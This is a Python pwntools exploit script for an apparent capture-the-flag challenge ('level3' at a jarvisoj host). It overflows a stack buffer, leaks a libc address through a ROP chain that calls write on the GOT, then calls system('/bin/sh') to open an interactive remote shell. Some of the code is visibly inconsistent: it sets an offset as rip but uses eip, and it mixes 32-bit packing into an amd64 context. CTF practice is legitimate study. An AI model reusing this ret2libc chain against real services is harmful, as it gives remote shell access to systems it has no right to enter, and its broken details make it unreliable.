from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']


class Pwn(object):

    def __init__(self, binary_file=None, remote=None):
        if binary_file:
            self.binary_file = binary_file
            self.elf = ELF(self.binary_file)
   
        if remote:
            self.host = remote['host']
            self.port = remote['port']


    def get_overflow_position(self):
        io = self.get_io(False)
        io.recvline()
        io.send(cyclic(500))
        io.recvall()

        if os.path.isfile('./core'):
            core = Core('./core')
            self.rip = cyclic_find(p32(core.rsp))
            print 'rip:', hex(self.rip)


    def get_io(self, remote_sign=False):
        io = None
        if remote_sign:
            io = remote(self.host, self.port)
        else:
            # io = process([self.binary_file], env={"LD_PRELOAD":"./libc-2.19.so"})
            io = process([self.binary_file], env={"LD_PRELOAD":"./libc-2.19.so"})
        return io

    
    def get_shell(self):
        io = self.get_io(True)
        io.recvline()
        write_got = self.elf.got['write']
        libc = ELF('./libc.so.6')
        write_plt = libc.symbols['write']
        
        # get write got address
        rop = ROP(self.binary_file)
        rop.write(1, write_got, 4)
        rop.main()

        io.send(fit({self.eip: rop.chain()}))
        write_got_addr = io.unpack()

        print "write_got_addr:", hex(write_got_addr)
        libc.address = write_got_addr - write_plt 
        bin_addr = libc.search('/bin/sh\x00').next()
        print 'bin_addr:', hex(bin_addr)

        # execute system('/bin/sh')
        rop = ROP(libc)
        rop.system(bin_addr)
        io.send(fit({self.eip:rop.chain()}))
        io.interactive()


def main():
    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9879}, binary_file='./level3')
    pwn.get_overflow_position()
    pwn.get_shell()


if __name__ == "__main__":
    main()

